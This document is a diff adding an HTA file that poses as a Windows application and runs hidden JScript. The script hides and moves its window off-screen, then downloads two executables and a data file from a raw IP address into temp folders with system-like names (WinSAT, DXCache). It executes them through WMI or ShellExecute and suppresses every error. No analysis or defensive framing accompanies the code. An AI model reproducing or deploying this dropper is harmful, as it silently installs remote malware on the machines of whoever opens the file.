@@ -1,0 +1,46 @@
+<html>
+<head>
+<meta http-equiv="x-ua-compatible" content="ie=9">
+<!-- qyopQw5vzFnpOpbLQqCRWCLbM1lOYu3ZFVmJZqmXHrt6jaAfGPFl5DAkjmZjxGWXh2YJoLCe0qwOIzgZmhcYKM3IO3GUriLJe5YTbmk9dgOe6FSDDE1dEuIpeG2V1sGbINwYz7ETXwqhRwZRALLVtLRueN2ywp0Ua72GauzflHmW9p3XlfSSmNebGlgxOKYrBQ7zCPWg4IwskSR3P5cIB43SKqMAQ6YulG7mDO37heumw4SX5G7LkJRE378nEwCIGPxeQ3HLRcHWMj2gjdJCgL4S9OcP7rXxIsugTnXoqlgG9gFzSPDvgRy3LUe4HfXvpKw1LdADo8SCJVw6QqV0vHWsqEFFz9HVlVB1u5TNHw0UHtdwMFQeCTNkujYieS9NV6QE7sWuIBrgSsKu5JipSqRWxSObZnIj8NJ1vluyhjLYujtmaVZrgwNyBrb4h1LRs0r2k04yIRLJ5yzgt7E7IImrnHE4m2509qFL2lpViOQsMOdQtsIHl6Zj1OeCrvSoDfpP1UwDNID0FSmUtMIFI59LwGhytMW1M2ZnqeSOjdZNY7VstV0jnYRYtkaQSKMOYuUKyMHmgqapj2TeijDwQoHHzY9QNtjdpv9GsmEDRIEq37cGDsvNfYMs94VXP0jGgZ6uX2aJb0tNYuAweWaOgzLknerbq3AP3JW9j73uYjQZ4PF6LDFHL88p5WdU6zIjMPG0xQLmng2idQBRTkWuMVZWE40g6q1e6LDeu6jfE2VcuASKnYFtWuHp9lEJxLkmDf1ozemkJYRFtsVUqpglX4qp8V81pXxvTsg58DvMRLUzAr1lzWnr2uK6suYoxNsjc96im3Bku4MjRNVtXjAqSZ20ThpCMowfitZr1gSLilZkfWeGqrcOOQgq2DfFlIUackrQIPrtGB7D4wubsMG7ZW1Ci6XiFF7S0WZ1QzJQKPAMVOWDGaVSqLbqGPfMdTy3b2tjmmRp7ColnMFJw9V7BPkAH9tD4A21YWq0u4CReiUVO68irQznx20TpEn6ahFjzJ7UK1wPIITvpxOtsmE1XtznsPTacmkqTalQcwJVx6QwMLwhtpTAquoqy5I6w8CYXX5sdOQhuZ9S -->
+<HTA:APPLICATION ID="q" APPLICATIONNAME="Windows" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="JScript">
+window.resizeTo(0,0);
+window.moveTo(-32000,-32000);
+try {
+  var sh = new ActiveXObject("WScript.Shell");
+  var fso = new ActiveXObject("Scripting.FileSystemObject");
+  var drop = sh.ExpandEnvironmentStrings("%TEMP%") + "\\WinSAT";
+  var ovDrop = sh.ExpandEnvironmentStrings("%TEMP%") + "\\DXCache";
+  var curl = sh.ExpandEnvironmentStrings("%SystemRoot%") + "\\System32\\curl.exe";
+  if (!fso.FolderExists(drop)) fso.CreateFolder(drop);
+  if (!fso.FolderExists(ovDrop)) fso.CreateFolder(ovDrop);
+  sh.CurrentDirectory = drop;
+  var ovExe = ovDrop + "\\o.exe";
+  var ovDat = ovDrop + "\\ov.dat";
+  var pureExe = drop + "\\purelast.exe";
+  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + pureExe + '" http://79.110.49.129:8080/ayan/RuLnbcv9dlmEX7F6ez10.exe', 0, true);
+  if (fso.FileExists(pureExe) && fso.GetFile(pureExe).Size > 1000000) {
+    try {
+      var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+      var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+      si.ShowWindow = 1;
+      var proc = wmi.Get("Win32_Process");
+      var inp = proc.Methods_("Create").inParameters.SpawnInstance_();
+      inp.CommandLine = "purelast.exe";
+      inp.CurrentDirectory = drop;
+      inp.ProcessStartupInformation = si;
+      proc.ExecMethod_("Create", inp);
+    } catch (e2) {
+      var app = new ActiveXObject("Shell.Application");
+      app.ShellExecute("purelast.exe", "", drop, "open", 1);
+    }
+  }
+  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + ovExe + '" http://79.110.49.129:8080/ayan/p5wPgZnWF3LGjsEbYryf.exe', 0, true);
+  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + ovDat + '" http://79.110.49.129:8080/ayan/QFOltCgLKA0nGRcz6YmJ.dat', 0, true);
+  if (fso.FileExists(ovExe) && fso.GetFile(ovExe).Size > 40000 && fso.FileExists(ovDat) && fso.GetFile(ovDat).Size > 1000000) sh.Run('"' + ovExe + '"', 0, false);
+} catch (e) {}
+window.close();
+</script>
+</head>
+<body></body>
+</html>
